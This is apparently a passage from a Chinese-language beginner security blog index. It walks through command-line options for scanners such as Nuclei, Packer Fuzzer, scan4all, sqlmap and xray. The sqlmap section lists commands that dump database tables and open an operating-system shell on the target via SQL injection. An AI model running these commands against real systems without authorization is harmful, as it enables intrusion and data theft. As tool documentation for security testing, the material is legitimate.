执行有标记的模板子集</span><br><span class="line">   -etags, -exclude-tags string[]       执行标记为排除的模板</span><br><span class="line">   -itags, -include-tags string[]       不执行具有攻击性的模板</span><br><span class="line">   -et, -exclude-templates string[]     要排除的模板或者模板目录</span><br><span class="line">   -it, -include-templates string[]     执行默认或配置中排除的模板</span><br><span class="line">   -s, -severity value[]                根据严重程度运行模板，可候选的值有：info,low,medium,high,critical   </span><br><span class="line">   -es, -exclude-severity value[]       根据严重程度排除模板，可候选的值有：info,low,medium,high,critical   </span><br><span class="line">   -a, -author string[]                 执行指定作者的模板</span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line">   -o, -output string                   输出发现的问题到文件</span><br><span class="line">   -silent                              只显示结果</span><br><span class="line">   -nc, -no-color                       禁用输出内容着色（ANSI转义码）</span><br><span class="line">   -json                                输出为jsonL（ines）</span><br><span class="line">   -irr, -include-rr                    在JSONL中输出对应的请求和相应（仅结果）</span><br><span class="line">   -nm, -no-meta                        不显示匹配的元数据</span><br><span class="line">   -nts, -no-timestamp                  不在输出中显示时间戳</span><br><span class="line">   -rdb, -report-db string              本地的Nuclei结果数据库（始终使用该数据库保存结果）       </span><br><span class="line">   -me, -markdown-export string         以markdown导出结果</span><br><span class="line">   -se, -sarif-export string            以SARIF导出结果</span><br><span class="line"></span><br><span class="line">配置：</span><br><span class="line">   -config string                       指定Nuclei的配置文件</span><br><span class="line">   -rc, -report-config string           指定Nuclei报告模板文件</span><br><span class="line">   -H, -header string[]                 指定报告中的标题：value格式</span><br><span class="line">   -V, -var value                       通过var=value指定var值</span><br><span class="line">   -r, -resolvers string                指定Nuclei的解析文件</span><br><span class="line">   -sr, -system-resolvers               当DNS错误时使用系统DNS</span><br><span class="line">   -passive                             启用被动扫描处理HTTP响应</span><br><span class="line">   -ev, env-vars                        在模板中使用环境变量</span><br><span class="line"></span><br><span class="line">交互：</span><br><span class="line">   -inserver, -ineractsh-server string  使用interactsh反连检测平台（默认为&quot;https://interact.sh&quot;）</span><br><span class="line">   -itoken, -interactsh-token string    指定反连检测平台的身份凭证</span><br><span class="line">   -interactions-cache-size int         指定保存在交互缓存中的请求数（默认：5000）</span><br><span class="line">   -interactions-eviction int           从缓存中删除请求前等待的时间（默认为60秒）</span><br><span class="line">   -interactions-poll-duration int      每个轮询前等待时间（默认为5秒）</span><br><span class="line">   -interactions-cooldown-period int    退出轮询前的等待时间（默认为5秒）</span><br><span class="line">   -ni, -no-interactsh                  禁用反连检测平台，同时排除基于反连检测的模板</span><br><span class="line"></span><br><span class="line">限速：</span><br><span class="line">   -r1, -rate-limit int                 每秒最大请求量（默认：150）</span><br><span class="line">   -rlm, -rate-limit-minute int         每分钟最大请求量</span><br><span class="line">   -bs, -bulk-size int                  每个模板最大并行检测数（默认：25）</span><br><span class="line">   -c, -concurrency int                 并行执行的最大模板数量（默认：25）</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">优化：</span><br><span class="line">   -timeout int                         超时时间（默认为5秒）</span><br><span class="line">   -retries int                         重试次数（默认：1）</span><br><span class="line">   -mhe, -max-host-error int            某主机扫描失败次数，跳过该主机（默认：30）</span><br><span class="line">   -project                             使用项目文件夹避免多次发送同一请求</span><br><span class="line">   -project-path string                 设置特定的项目文件夹</span><br><span class="line">   -spm, -stop-at-first-path            得到一个结果后停止（或许会中断模板和工作流的逻辑）</span><br><span class="line">   -stream                              流模式 - 在不整理输入的情况下详细描述</span><br><span class="line"></span><br><span class="line">无界面浏览器：</span><br><span class="line">    -headless                           启用需要无界面浏览器的模板</span><br><span class="line">    -page-timeout int                   在无界面下超时秒数（默认：20）</span><br><span class="line">    -sb, -show-brower                   在无界面浏览器运行模板时，显示浏览器</span><br><span class="line">    -sc, -system-chrome                 不使用Nuclei自带的浏览器，使用本地浏览器</span><br><span class="line"></span><br><span class="line">调试：</span><br><span class="line">    -debug                              显示所有请求和响应</span><br><span class="line">    -debug-req                          显示所有请求</span><br><span class="line">    -debug-resp                         显示所有响应</span><br><span class="line">    -proxy, -proxy-url string           使用HTTP代理</span><br><span class="line">    -proxy-socks-url string             使用SOCK5代理</span><br><span class="line">    -tlog, -trace-log string            写入请求日志到文件</span><br><span class="line">    -version                            显示版本信息</span><br><span class="line">    -v, -verbose                        显示详细信息</span><br><span class="line">    -vv                                 显示额外的详细信息</span><br><span class="line">    -tv, -templates-version             显示已安装的模板版本</span><br><span class="line"></span><br><span class="line">升级：</span><br><span class="line">    -update                             更新Nuclei到最新版本</span><br><span class="line">    -ut, -update-templates              更新Nuclei模板到最新版</span><br><span class="line">    -ud, -update-directory string       覆盖安装模板</span><br><span class="line">    -duc, -disable-update-check         禁用更新</span><br><span class="line"></span><br><span class="line">统计：</span><br><span class="line">    -stats                              显示正在扫描的统计信息</span><br><span class="line">    -sj, -stats-json                    将统计信息以JSONL格式输出到文件</span><br><span class="line">    -si, -stats-inerval int             显示统计信息更新的间隔秒数（默认：5）</span><br><span class="line">    -m, -metrics                        显示Nuclei端口信息</span><br><span class="line">    -mp, -metrics-port int              更改Nuclei默认端口（默认：9092）</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="Packer-Fuzzer"><a href="#Packer-Fuzzer" class="headerlink" title="Packer Fuzzer"></a>Packer Fuzzer</h2><p>一款针对Webpack等前端打包工具所构造的网站进行快速、高效安全检测的扫描工具</p>
+<h3 id="全部参数-1"><a href="#全部参数-1" class="headerlink" title="全部参数"></a>全部参数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-u（--url）</span><br><span class="line"></span><br><span class="line">要扫描的网站网址路径，为必填选项，例如：-u https://demo.poc-sir.com；</span><br><span class="line"></span><br><span class="line">-c（--cookie）</span><br><span class="line"></span><br><span class="line">附加cookies内容，可为空，若填写则将全局传入，例如：-c &quot;POC=666;SIR=233&quot;；</span><br><span class="line"></span><br><span class="line">-d（--head)</span><br><span class="line"></span><br><span class="line">附加HTTP头部内容，可为空，若填写则将全局传入，默认为Cache-Control:no-cache，例如：-d &quot;Token:3VHJ32HF0&quot;；</span><br><span class="line"></span><br><span class="line">-l（--lang）</span><br><span class="line"></span><br><span class="line">语言选项，当为空时自动选择系统对应语言选项，若无对应语言包则自动切换至英文界面。可供选择的语言包有：简体中文(zh)、法语(fr)、西班牙语(es)、英语(en)、日语(ja)，例如：-l zh；</span><br><span class="line"></span><br><span class="line">-t（--type）</span><br><span class="line"></span><br><span class="line">分为基础版和高级版，当为空时默认使用基础版。高级版将会对所有API进行重新扫描并模糊提取API对应的参数，并进行：SQL注入漏洞、水平越权漏洞、弱口令漏洞、任意文件上传漏洞的检测。可使用adv选项进入高级版，例如：-t adv；</span><br><span class="line"></span><br><span class="line">-p（--proxy）</span><br><span class="line"></span><br><span class="line">全局代理，可为空，若填写则全局使用代理IP，例如：-p https://hack.cool:8080；</span><br><span class="line"></span><br><span class="line">-j（--js）</span><br><span class="line"></span><br><span class="line">附加JS文件，可为空，当您认为还有其他JS文件需要本工具分析时，可使用此选项，例如：-j https://demo.poc-sir.com/js/index.js,https://demo.poc-sir.com/js/vue.js；</span><br><span class="line"></span><br><span class="line">-b（--base）</span><br><span class="line"></span><br><span class="line">指定API中间部分（例如某API为：https://demo.poc-sir.com/v1_api/login 时，则其basedir为：v1_api），可为空，当您认为本工具自动提取的basedir不准确时，可使用此选项，例如：-b v1_api；</span><br><span class="line"></span><br><span class="line">-r（--report）</span><br><span class="line"></span><br><span class="line">指定生成的报告格式，当为空时默认生成HTML和DOC格式的报告。可供选择的报告格式有：html、doc、pdf、txt，例如：-r html,pdf；</span><br><span class="line"></span><br><span class="line">-e（--ext）</span><br><span class="line"></span><br><span class="line">是否开启扩展插件选项，本工具支持用户自我编写插件并存入ext目录（如何编写请参考对应目录下demo.py文件）。默认为关闭状态，当用户使用on命令开启时，本工具将会自动执行对应目录下的插件，例如：-e on；</span><br><span class="line"></span><br><span class="line">-f（--flag）</span><br><span class="line"></span><br><span class="line">SSL连接安全选项，当为空时默认关闭状态，在此状态下将会阻止一切不安全的连接。若您希望忽略SSL安全状态，您可使用1命令开启，将会忽略一切证书错误，例如：-f 1；</span><br><span class="line"></span><br><span class="line">-s（--silent）</span><br><span class="line"></span><br><span class="line">静默选项，一旦开启则一切询问YES或NO的操作都将自动设置为YES，并且参数后的内容便是本次扫描报告的名称（自定义报告名），可用于无人值守、批量操作、插件调用等模式，例如：-s Scan_Task_777。</span><br><span class="line"></span><br><span class="line">--st（--sendtype）</span><br><span class="line"></span><br><span class="line">请求方式选项，目前本选项支持POST和GET参数，一旦开启则将会使用对应的请求方式扫描所有的API，若不开启将会通过HTTP状态码来进行智能请求。</span><br><span class="line"></span><br><span class="line">--ct（--contenttype）</span><br><span class="line"></span><br><span class="line">Content-Type选项，可通过此选项自定义扫描时的HTTP请求头中的Content-Type参数内容，若不开启将会通过HTTP状态码来进行智能请求。</span><br><span class="line"></span><br><span class="line">--pd（--postdata）</span><br><span class="line"></span><br><span class="line">POST内容选项，可通过此选项自定义扫描时的POST请求内容(所有的扫描都将会使用此内容，仅对POST场景有效)，若不开启将会通过HTTP状态码来进行智能请求。</span><br><span class="line"></span><br><span class="line">--ah（--apihost）</span><br><span class="line"></span><br><span class="line">Api域名选项，可通过此选项自定义扫描时所有的API请求域名，例如：api部分(从JS中提取到的API路径)为/v1/info，扫描的url(-u --url参数传入内容，扫描的网页)为http://exp.com/，当apihost参数传入https://pocsir.com:777/则此时的API为https://pocsir.com:777/v1/info而不是http://exp.com/v1/info，用于api与前端不同域名或服务器等场景。</span><br><span class="line"></span><br><span class="line">--fe（--fileext）</span><br><span class="line"></span><br><span class="line">Api扩展名选项，可通过此选项对所有API都添加特定的扩展名，以便应对在提取API时出现扩展名提取缺失的情况，例如：当提取到的API为https://pocsir.com:777/v1/info时，传入--fe .json则工具将会自动将API转化成https://pocsir.com:777/v1/info.json进行扫描及检测。</span><br></pre></td></tr></table></figure>
+
+<h2 id="scan4all"><a href="#scan4all" class="headerlink" title="scan4all"></a>scan4all</h2><p>集成 vscan、nuclei、ksubdomain、subfinder等，充分自动化、智能化 并对这些集成的项目进行代码级别优化、参数优化，个别模块,如 vscan filefuzz部分进行了重写</p>
+<h3 id="常用参数"><a href="#常用参数" class="headerlink" title="常用参数"></a>常用参数</h3><p>对 127.0.0.1 进行http常用端口扫描，扫描完端口后对端口地址进行检测</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scan4all -host 127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<p>直接对端口地址测试</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scan4all -host http://127.0.0.1:7001</span><br></pre></td></tr></table></figure>
+
+<p>对 192.168.1.1&#x2F;24 C段进行端口扫描，扫描完端口后对端口地址进行检测</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scan4all -host 192.168.1.1/24</span><br></pre></td></tr></table></figure>
+
+<p>对 ips.txt 内的 ip&#x2F;域名&#x2F;c段&#x2F;url地址 进行逐行检测(如果有url地址，则不会进行端口扫描)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scan4all -l ips.txt</span><br></pre></td></tr></table></figure>
+
+<p>对 127.0.0.1 的7001,7002端口进行检测</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scan4all -host 127.0.0.1 -p 7001,7002</span><br></pre></td></tr></table></figure>
+
+<p>对 127.0.0.1 进行 NmapTop1000 端口进行检测 (不使用此参数，默认进行http常用端口扫描)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scan4all -host 127.0.0.1 -top-Ports 1000</span><br><span class="line">scan4all -host 127.0.0.1 -top-Ports http</span><br></pre></td></tr></table></figure>
+
+<p>使用dnslog</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scan4all -host 127.0.0.1 -ceyeapi xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx -ceyedomain xxxxxx.ceye.io</span><br></pre></td></tr></table></figure>
+
+<p>导出到文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scan4all -host 127.0.0.1 -json -o 1.json</span><br><span class="line">scan4all -host 127.0.0.1 -csv -o 1.csv</span><br></pre></td></tr></table></figure>
+
+<p>只扫描端口和指纹不检测poc</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scan4all -host 127.0.0.1 -np</span><br></pre></td></tr></table></figure>
+
+<p>设置扫描线程和速率&amp;#x20;</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scan4all -host 127.0.0.1 -c 25 -rate 1000</span><br></pre></td></tr></table></figure>
+
+<p>设置代理</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-proxy socks5://127.0.0.1:1080</span><br></pre></td></tr></table></figure>
+
+<h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><p>SQL注入检测工具</p>
+<h3 id="常用参数-1"><a href="#常用参数-1" class="headerlink" title="常用参数"></a>常用参数</h3><p>判断注入是否存在</p>
+<p>sqlmap.py -u “<a href="http://www.xxx.com/user.jsp?id=1">www.xxx.com/user.jsp?id=1</a>“<br></p>
+<p>直接加载数据包测试</p>
+<p>sqlmap.py -r head.txt –dbs  &#x2F;&#x2F;head.txt 内容为 HTTP 请求<br></p>
+<p>获取数据库</p>
+<p>sqlmap.py -u “<a href="http://www.xxx.com/user.jsp?id=1">www.xxx.com/user.jsp?id=1</a>“ –dbs<br></p>
+<p>查看当前应用程序所用数据库</p>
+<p>sqlmap.py -u “<a href="http://www.xxx.com/user.jsp?id=1">www.xxx.com/user.jsp?id=1</a>“ –current-db<br></p>
+<p>列出指定数据库的所有表</p>
+<p>sqlmap.py -u “<a href="http://www.xxx.com/user.jsp?id=1">www.xxx.com/user.jsp?id=1</a>“ –table -D “数据库”</p>
+<p>读取指定表中的字段名称</p>
+<p>sqlmap.py -u “<a href="http://www.xxx.com/user.jsp?id=1">www.xxx.com/user.jsp?id=1</a>“ –columns -T “数据表” -D “数据库”</p>
+<p>读取指定字段内容</p>
+<p>sqlmap.py -u “<a href="http://www.xxx.com/user.jspid=1">www.xxx.com/user.jspid=1</a>“ –dump -C”字段” -T “数据表” -D “数据库”</p>
+<p>执行Shell命令</p>
+<p>sqlmap.py -u “URL” –os-cmd&#x3D;”net user”  &#x2F;&#x2F;执行 net user 命令</p>
+<p>sqlmap.py -u “URL” –os-shell  &#x2F;&#x2F;系统交互的shell</p>
+<p>POST提交方式</p>
+<p>sqlmap.py -u “URL” –data “POST参数”</p>
+<p>显示详细的等级</p>
+<p>sqlmap.py -u “URL” –dbs -v 1</p>
+<p>-v 参数包含以下7个等级。</p>
+<p>·0：只显示Python的回溯、错误和关键消息；</p>
+<p>·1：显示信息和警告信息；</p>
+<p>·2：显示调试信息；</p>
+<p>·3：有效载荷注入；</p>
+<p>·4：显示HTTP请求；</p>
+<p>·5：显示HTTP响应头；</p>
+<p>·6：显示HTTP响应页面的内容。</p>
+<p>注入等级</p>
+<p>sqlmap.py -u “URL” –level 3</p>
+<p><br>将注入语句插入到指定位置（常用于伪静态注入）</p>
+<p>sqlmap.py -u “<a href="http://www.xxx.com/id/2//*.html">http://www.xxx.com/id/2\\*.html</a>“ –dbs</p>
+<p>使用 Sqlmap 插件</p>
+<p>sqlmap.py -u “URL” –tamper “space2morehash.py”</p>
+<h2 id="TscanPlus"><a href="#TscanPlus" class="headerlink" title="TscanPlus"></a>TscanPlus</h2><p>一款综合性网络安全检测和运维工具，旨在快速资产发现、识别、检测，构建基础资产信息库，协助甲方安全团队或者安全运维人员有效侦察和检索资产，发现存在的薄弱点和攻击面。</p>
+<figure><img src="https://2843206953-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuQdEIFRPpmirHXN97b5y%2Fuploads%2Fvvwwpaj2jg7PsiZMyzg6%2Fimage.png?alt=media&#x26;token=3984e4e2-e6e0-4dcd-82a4-ec55d3df11ca" alt=""><figcaption></figcaption></figure>
+
+<h2 id="xray"><a href="#xray" class="headerlink" title="xray"></a>xray</h2><p>一款长亭自研的完善的安全评估工具，支持常见 web 安全问题扫描和自定义 poc | 使用之前务必先阅读文档</p>
+<p>使用基础爬虫爬取并对爬虫爬取的链接进行漏洞扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xray webscan --basic-crawler http://example.com --html-output vuln.html</span><br></pre></td></tr></table></figure>
+
+<p>使用 HTTP 代理进行被动扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xray webscan --listen 127.0.0.1:7777 --html-output proxy.html</span><br></pre></td></tr></table></figure>
+
+<p>设置浏览器 http 代理为 <code>http://127.0.0.1:7777</code>，就可以自动分析代理流量并扫描。</p>
+<p>只扫描单个 url，不使用爬虫</p>
+<p>xray webscan –url <a href="http://example.com/?a=b">http://example.com/?a=b</a> –html-output single-url.html</p>
+]]></content>
+      <categories>
+        <category>网络安全</category>
+      </categories>
+      <tags>
+        <tag>网络安全</tag>
+        <tag>新手教程</tag>
+      </tags>
+  </entry>
 </search>
